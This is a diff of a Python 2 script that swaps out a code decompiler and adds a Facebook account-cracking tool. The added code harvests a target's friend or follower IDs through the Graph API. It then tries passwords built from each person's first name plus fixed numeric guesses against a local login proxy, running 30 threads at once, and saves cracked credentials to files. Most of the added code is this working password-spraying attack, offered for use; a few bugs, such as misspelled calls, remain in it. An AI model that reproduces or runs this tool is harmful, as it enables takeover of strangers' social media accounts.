-        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
-
+        abm = open("/sdcard/.abm.txt", "r").read()
+    except (KeyError , IOError):
+        menu_login()
         os.system('clear')
-
-        menu()
-
-def mzb():
-
-    print 'Decompile Marshal,Zlib,Base64'
-
-    a = raw_input('File : ' )
-
-    b = open(a).read().replace('exec(', 'x = ').replace('))))',')))')
-
-    note = 'DECOMPILED BY TIMMY TEDY'
-
-    c = open('mi.py', 'w')
-
-    if 'marshal' in b:
-
-        c.write('from sys import stdout\nfrom uncompyle6.main import decompile\n' + b + '\ndecompile(2.7, x, stdout)')
-
-        c.close()
-
-    elif 'marshal' not in b:
-
-        c.write(b + '\nprint (x)')
-
-        c.close()
-
-    d = a.replace('.py', '-d.py')
-
-    os.system('python2 mi.py > ' + d)
-
-    e = open(d).read()
-
-    f = open(d, 'w')
-
-    f.write(e + ' \n\n\n\t' + note )
-
-    f.close()
-
-    os.system('rm -rf mi.py')
-
-    print('\x1b[31;1m[\x1b[0;37m+\x1b[31;1m]\x1b[0;37m File saved as\x1b[32;1m ' + d)
-
-    print('Mau Dec Lagi Y or N ?')
-
-    cuk = raw_input('Pilih : ')
-
-    if cuk == 'y':
-
-      mzb()
-
-    elif cuk == 'n':
-
-      exit()
-
-def zl():
-
-    print 'Decompile Zlib'
-
-    a = raw_input('File : ')
-
-    b = open(a).read().replace('exec', 'print')
-
-    c = open('ma.py', 'w')
-
-    if 'zlib' in b:
-
-        c.write('# Bacod\n' + b + '# Loe Kontol')
-
-        c.close()
-
-    elif 'zlib' not in b:
-
-        c.write(b + '\nprint (print)')
-
-        c.close()
-
-    d = a.replace('.py', '-d.py')
-
-    os.system('python2 ma.py > '+ d)
-
-    e = open(d).read().replace('# uncompyle6 version 3.6.2', '# Versi Unkompel 0.0 :v').replace('# Embedded file name: ','# Ini Nih:v ').replace('# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:28:22)', '# Decompel By Mark Cornel').replace('# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://', 'Halo Om').replace('# Python bytecode 2.7', '# Piton Bitkode 2.7')
-
-    f = open(d, 'w')
-
-    f.write('# Suksess Decompile ✓ \n'+ e)
-
-    f.close()
-
-    os.system('rm -rf ma.py')
-
-    print('File saced as '+ d)
-
-    sys.exit()
-
-def exit():
-
-        run('thanks for using my tools Bro :)')
-
-        sys.exit()
-
-if __name__ == '__main__':
-
-    if os.path.exists('unpyc'):
-
-        menu()
-
+	print banner
+	print("\033[1;93mPlease Wait A Mintue").center(50)
+	print("")
+        os.system("cd .empty && npm install")
+        os.system("fuser -k 5000/tcp &")
+        os.system("cd .empty && node index.js &")
+        time.sleep(3)
+        menu_login()
     else:
-
-        os.system('mkdir unpyc')
-
-#	logo()
-
+        os.system("clear")
+	print banner
+	print("\033[1;93mThis Tool Is temporarily lock").center(50)
+	print('')
+	print("\033[1;93mPut Api Key To Unlock This Tool").center(50)
+	print('')
+	api = raw_input("\033[1;97m[!] Put Api Key :\033[0;90m ")
+	if api =="FAMOUS":
+		print("")
+		time.sleep(3)
+		print("\033[1;92mTool Has Unlock Success").center(50)
+		print("")
+		time.sleep(2)
+		menu_login()
+	else:
+		print("")
+		time.sleep(1)
+		print("\033[1;91mApi Key Is Invalid").center(50)
+		print("")
+		time.sleep(3)
+		user_info()
+		
+def menu_login():
+	os.system("clear")
+	print banner
+	print("[1] Login With Access Token")
+	print("[2] Login With Fb Password")
+	print("[0] Direct Exir")
+	print(50*"-")
+	menu_login2() 
+def menu_login2():
+	user_select = raw_input("\n[!] Choose ---> ")
+	if user_select =="1":
+		os.system("clear")
+		print banner
+		print("Login With Token").center(50)
+		print("")
+                token = raw_input("\033[1;97m[!] Put Token : \033[0;90m")
+                token_ab = open("access_token.txt", "w")
+                token_ab.write(token)
+                token_ab.close()
+		print("")
+		print("\033[1;92mToken login success").center(50)
+		time.sleep(2)
+		os.system("cd .empty && npm install")
+                os.system("fuser -k 5000/tcp &")
+                os.system("cd .empty && node index.js &")
+                time.sleep(3)
+                menu()
+	if user_select =="2":
+		login_fb()
+	elif user_select =="0":
+		os.system("exit")
+	else:
+		print("")
+		print("Enter Valid Option")
+		print("")
+		time.sleep(3)
+		menu_login()
+		
+def login_fb():
+    os.system("clear")
+    print banner
+    lid = raw_input("[!] ID/Email/No: ")
+    pwds = raw_input("[!] Password : ")
+    data = requests.get("http://localhost:5000/auth?id=" + uid + "&pass=" + pwd).text
+    q = json.loads(data)
+    if "loc" in q:
+        login_abm = open('access_token.txt', 'w')
+        login_abm.write(q["loc"])
+        login_abm.close()
+	print("")
+	print("\033[1;92mLogin Success").center(50)
+	time.sleep(3)
         menu()
+    elif 'www.facebook.com' in q['error']:
+        print("")
+        print("Email Or Password Has Wrong").center(50)
+	time.sleep(3)
+        login_fb()
+    else:
+        print("")
+        print("Login Has CheckPoint").center(50)
+        print("")
+        time.seelp(3)
+	login_fb()
+		
+def menu():
+    os.system("clear")
+    try:
+        token = open("access_token.txt", "r").read()
+    except(KeyError , IOError):
+        menu_login()
+    try:
+        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
+        q = json.loads(r.text)
+        name = q["name"]
+    except(KeyError):
+        print banner
+        print("")
+        print("logged account has checkpoint").center(50)
+	time.sleep(3)
+        os.system("rm -rf access_token.txt")
+        print("")
+        time.sleep(1)
+        menu_login()
+    os.system("clear")
+    print banner
+    print("\033[0;90m\tlogged user : " +name)
+    print("")
+    print("\033[1;97m [1] Clone Friendlist And Public ID")
+    print("\033[1;97m [2] Clone With Auto Password")
+    print("\033[1;97m [3] View Your Login Token")
+    print("\033[1;97m [4] Update Tool")
+    print("\033[1;97m [0] Main Menu Back")
+    print(50*"-")
+    menu_select()
+def menu_select():
+	select = raw_input("\n[!] Choose : ")
+	if select =="1":
+		crack()
+	elif select =="2":
+		choose()
+	elif select =="3":
+		view_token()
+	elif select =="4":
+		os.system("cd .empty && npm install")
+                os.system("fuser -k 5000/tcp &")
+                os.system("cd .empty && node index.js &")
+		os.system("git pull")
+		time.sleep(2)
+		menu()
+	elif select =="0":
+		os.system("clear")
+	        print banner
+	        print("")
+	        raw_input("Press Enter To Tool Logout")
+	        time.sleep(3)
+	        os.system("exit")
+	else:
+		print("")
+		print("\tSelect valid option")
+		print("")
+		menu_select()
+def crack():
+	global token
+	os.system("clear")
+	try:
+		token = open("access_token.txt","r").read()
+	except IOError:
+		print("")
+		print("\tToken not found ")
+		time.sleep(1)
+		menu_login()
+	os.system("clear")
+	print banner
+	print("[1] Crack With Public ID/Link")
+	print("[2] Crack With Followers ID/Links")
+	print("[0] Direct Back")
+	print(50*"-")
+	crack_select()
+def crack_select():
+	select = raw_input("[!] Choose option: ")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		print banner
+		idt = raw_input("[!] Put ID/Username : ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			os.system('clear')
+			print banner
+			print("[!] Target User : "+q["name"])
+		except KeyError:
+			print("")
+			print("\033[1;91mInvalid Link Or Friendlist Has Privact").center(50)
+			print("")
+			time.sleep(3)
+			crack()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="2":
+		os.system("clear")
+		print banner
+		idt = raw_input("[!] Put ID/Username : ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			os.system("clear")
+			print banner
+			print("[!] Target User : "+q["name"])
+		except KeyError:
+			print("\tInvalid id link")
+			print("")
+			raw_input(" Press enter to back")
+			crack()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="0":
+	    menu()
+	else:
+		print("")
+		print("\033[1;91mPlease Select A Valid Option").center(50)
+		print("")
+		time.sleep(3)
+		crack_select()
+	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
+	time.sleep(0.05)
+	print("[!]\033[1;95m Cracking Start...")
+	time.sleep(0.05)
+	print("[!]\033[1;95m Please wait clone account will be appear here\033[1;0m")
+	time.sleep(0.05)
+	print(50*"-")
+
+			
+	def main(arg):
+		user=arg
+		uid,name=user.split("|")
+		try:
+			pass1 = name+"123"
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
+			q = json.loads(data)
+			if "loc" in q:
+				print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
+				ok = open("ok.txt","a")
+				ok.write(uid+" | "+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in q["error"]:
+					print("\033[1;91m[MARK-CP] "+uid+" | "+pass1)
+					cp = open("cp.txt","a")
+					cp.write(uid+" | "+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
+				else:
+					pass2 = name+"1234"
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
+					q = json.loads(data)
+					if "loc" in q:
+						print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
+						ok = open("ok.txt","a")
+						ok.write(uid+" | "+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q["error"]:
+							print("\033[1;91m[MARK-CP] "+uid+" | "+pass2)
+							cp = open("cp.txt","a")
+							cp.write(uid+" | "+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+						else:
+							pass3 = name+"12345"
+							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
+							q = json.loads(data)
+							if "loc" in q:
+								print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
+								ok = open("ok.txt","a")
+								ok.write(uid+" | "+pass3+"\n")
+								ok.close()
+								oks.append(uid+pass3)
+							else:
+								if "www.facebook.com" in q["error"]:
+									print("\033[1;91m[MARK-CP] "+uid+" | "+pass3)
+									cp = open("cp.txt","a")
+									cp.write(uid+" | "+pass3+"\n")
+									cp.close()
+									cps.append(uid+pass3)
+								else:
+									pass4 = name+"786"
+									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
+									q = json.loads(data)
+									if "loc" in q:
+										print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
+										ok = open("ok.txt","a")
+										ok.write(uid+" | "+pass4+"\n")
+										ok.close()
+										oks.append(uid+pass4)
+									else:
+										if "www.facebook.com" in q["error"]:
+											print("\033[1;91m[MARK-CP] "+uid+" | "+pass4)
+											cp = open("cp.txt","a")
+											cp.write(uid+" | "+pass4+"\n")
+											cp.close()
+											cps.apppend(uid+pass4)
+										else:
+											pass5 = "334455"
+											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
+											q = json.loads(data)
+											if "loc" in q:
+												print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
+												ok = open("ok.txt","a")
+												ok.write(uid+" | "+pass5+"\n")
+												ok.close()
+												oks.append(uid+pass5)
+											else:
+												if "www.facebook.com" in q["error"]:
+													print("\033[1;91m[MARK-CP] "+uid+" | "+pass5)
+													cp = open("cp.txt","a")
+													cp.write(uid+" | "+pass5+"\n")
+													cp.close()
+													cps.append(uid+pass5)
+												else:
+													pass6 = "223344"
+													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
+													q = json.loads(data)
+													if "loc" in q:
+														print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
+														ok = open("ok.txt","a")
+														ok.write(uid+" | "+pass6+"\n")
+														ok.close()
+														oks.append(uid+pass6)
+													else:
+														if "www.facebook.com" in q["error"]:
+															print("\033[1;91m[MARK-CP] "+uid+" | "+pass6)
+															cp = open("cp.txt","a")
+															cp.write(uid+" | "+pass6+"\n")
+															cp.close()
+															cps.append(uid+pass6)
+														else:
+															pass7 = "445566"
+															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
+															q = json.loads(data)
+															if "loc" in q:
+																print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
+																ok = open("ok.txt","a")
+																ok.write(uid+" | "+pass7+"\n")
+																ok.close()
+																oks.append(uid+pass7)
+															else:
+																if "www.facebook.com" in q["error"]:
+																	print("\033[1;91m[MARK-CP] "+uid+" | "+pass7)
+																	cp = open("cp.txt","a")
+																	cp.write(uid+" | "+pass7+"\n")
+																	cp.close()
+																	cps.append(uid+pass7)
+															        else:
+															                pass8 = "556677"
+															                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8, headers=header).text
+															                q = json.loads(data)
+															                if "loc" in q:
+																                print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
+																                ok = open("ok.txt","a")
+																                ok.write(uid+" | "+pass8+"\n")
+																                ok.close()
+																                oks.append(uid+pass8)
+															                else:
+																                if "www.facebook.com" in q["error"]:
+																	                print("\033[1;91m[MARK-CP] "+uid+" | "+pass8)
+																	                cp = open("cp.txt","a")
+																	                cp.write(uid+" | "+pass8+"\n")
+																	                cp.close()
+																	                cps.append(uid+pass8)
+																	        else:
+															                                pass9 = "1234567"
+															                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9, headers=header).text
+															                                q = json.loads(data)
+															                                if "loc" in q:
+																                                print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
+																                                ok = open("ok.txt","a")
+																                                ok.write(uid+" | "+pass9+"\n")
+																                                ok.close()
+																                                oks.append(uid+pass9)
+															                                else:
+																                                if "www.facebook.com" in q["error"]:
+																	                                print("\033[1;91m[MARK-CP] "+uid+" | "+pass9)
+																	                                cp = open("cp.txt","a")
+																	                                cp.write(uid+" | "+pass9+"\n")
+																	                                cp.close()
+																	                                cps.append(uid+pass9)
+																			        else:
+															                                                pass10 = "112233"
+															                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10, headers=header).text
+															                                                q = json.loads(data)
+															                                                if "loc" in q:
+																                                                print("\033[1;92m[MARK-OK] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
+																                                                ok = open("ok.txt","a")
+																                                                ok.write(uid+" | "+pass10+"\n")
+																                                                ok.close()
+																                                                oks.append(uid+pass10)
+															                                                else:
+																                                                if "www.facebook.com" in q["error"]:
+																	                                                print("\033[1;91m[MARK-CP] "+uid+" | "+pass10)
+																	                                                cp = open("cp.txt","a")
+																	                                                cp.write(uid+" | "+pass10+"\n")
+																	                                                cp.close()
+																	                                                cps.append(uid+pass10)
+																
+		except:
+			pass
+	
+	p = ThreadPool(30)
+	p.map(main,id)
+	print(50*"-")
+	print("[!] The process has completed")
+	print("[!] Total OK/CP:"+str(len(oks)))+"/"+str(len(cps))
+	raw_input("[!] Press Eter To Back")
+	crack()
+			
+def choose():
+	global token
+	os.system("clear")
+	try:
+		token = open("access_token.txt","r").read()
+	except IOError:
+		print("")
+		print("Token Not Found OR Has CheckPoint").center(50)
+		time.sleep(2)
+		menu_login()
+	os.system("clear")
+	print banner
+	print("[1] Crack With Public ID/Link")
+	print("[2] Crack With Follwers ID/Link")
+	print("[0] Main Menu Back")
+	print(50*"-")
+	choice_select()
+def choice_select():
+	select = raw_input("[!] Choose : ")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		print banner
+		idt = raw_input("[!] Put ID/Username  : ")
+		print("")
+		pass1 = raw_input("\033[1;97m[1] Enter Password :\033[1;93m ")
+		pass2 = raw_input("\033[1;97m[2] Enter Password :\033[1;93m ")
+		pass3 = raw_input("\033[1;97m[3] Enter Password :\033[1;93m ")
+		pass4 = raw_input("\033[1;97m[4] Enter Password :\033[1;93m ")
+		pass5 = raw_input("\033[1;97m[5] Enter Password :\033[1;93m ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			os.system('clear')
+			print banner
+			print("[!] Target User : "+q["name"])
+		except KeyError:
+			print("")
+			print("Public ID Not Found").center(50)
+			print("")
+			time.sleep(3)
+			choose()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="2":
+		os.system("clear")
+		print banner
+		idt = raw_input("[!] Put ID/Username  : ")
+		print("")
+		pass1 = raw_input("\033[1;97m[1] Enter Password :\033[1;93m ")
+		pass2 = raw_input("\033[1;97m[2] Enter Password :\033[1;93m ")
+		pass3 = raw_input("\033[1;97m[3] Enter Password :\033[1;93m ")
+		pass4 = raw_input("\033[1;97m[4] Enter Password :\033[1;93m ")
+		pass5 = raw_input("\033[1;97m[5] Enter Password :\033[1;93m ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			os.system('clear')
+			print banner
+			print("[!] Target User : "+q["name"])
+		except KeyError:
+			print("")
+			print("Public ID Not Found").center(50)
+			print("")
+			time.sleep(3)
+			choose()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="0":
+	    menu()
+	else:
+		print("")
+		print("\t    \033[1;91mSelect valid option\033[0;97m")
+		print("")
+		time.sleep(3)
+		choose()
+	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
+	time.sleep(0.05)
+	print("[!]\033[1;95m Cracking Start...")
+	time.sleep(0.05)
+	print("[!]\033[1;95m Plz wait clone account will be appear here\033[1;0m")
+	time.sleep(0.05)
+	print(50*"-")
+			
+			
+	def main(arg):
+		user=arg
+		uid,name=user.split("|")
+		try:
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
+			q = json.loads(data)
+			if "loc" in q:
+				print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
+				ok = open("successful.txt", "a")
+				ok.write(uid+" | "+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in q["error"]:
+					print("\033[1;91m[CheckPoint] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("checkpoint.txt","a")
+					cp.write(uid+" | "+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
+				else:
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
+					q = json.loads(data)
+					if "loc" in q:
+						print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
+						ok = open("successful.txt", "a")
+						ok.write(uid+" | "+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q["error"]:
+							print("\033[1;91m[CheckPoint] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("checkpoint.txt","a")
+							cp.write(uid+" | "+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+						else:
+							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
+							q = json.loads(data)
+							if "loc" in q:
+								print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
+								ok = open("successful.txt", "a")
+								ok.write(uid+" | "+pass3+"\n")
+								ok.close()
+								oks.append(uid+pass3)
+							else:
+								if "www.facebook.com" in q["error"]:
+									print("\033[1;91m[CheckPoint] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("checkpoint.txt","a")
+									cp.write(uid+" | "+pass3+"\n")
+									cp.close()
+									cps.append(uid+pass3)
+								else:
+									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
+									q = json.loads(data)
+									if "loc" in q:
+										print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
+										ok = open("successful.txt", "a")
+										ok.write(uid+" | "+pass4+"\n")
+										ok.close()
+										oks.append(uid+pass4)
+									else:
+										if "www.facebook.com" in q["error"]:
+											print(" \033[1;91m[CheckPoint] "+uid+" | "+pass4+"\033[0;97m")
+											cp = open("checkpoint.txt","a")
+											cp.write(uid+" | "+pass4+"\n")
+											cp.close()
+											cps.apppend(uid+pass4)
+									        else:
+									                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
+									                q = json.loads(data)
+									                if "loc" in q:
+										                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
+										                ok = open("successful.txt", "a")
+										                ok.write(uid+" | "+pass5+"\n")
+										                ok.close()
+										                oks.append(uid+pass5)
+									                else:
+										                if "www.facebook.com" in q["error"]:
+											                print(" \033[1;91m[CheckPoint] "+uid+" | "+pass5+"\033[0;97m")
+											                cp = open("checkpoint.txt","a")
+											                cp.write(uid+" | "+pass5+"\n")
+											                cp.close()
+											                cps.apppend(uid+pass5)
+													
+																
+		except:
+			pass
+	
+	p = ThreadPool(30)
+	p.map(main,id)
+	print(50*"-")
+	print("[!] The process has completed")
+	print("[!] Total OK/CP :"+str(len(oks)))+"/"+str(len(cps))
+	raw_input("[!] Press enter to back")
+	choose()
+		    
+def view_token():
+    os.system("clear")
+    print banner
+    print("")
+    os.system("cat .fb_token.txt")
+    print("")
+    raw_input(" Press enter to main menu ")
+    menu()
+			
+if __name__ == '__main__':
+	user_info()
+
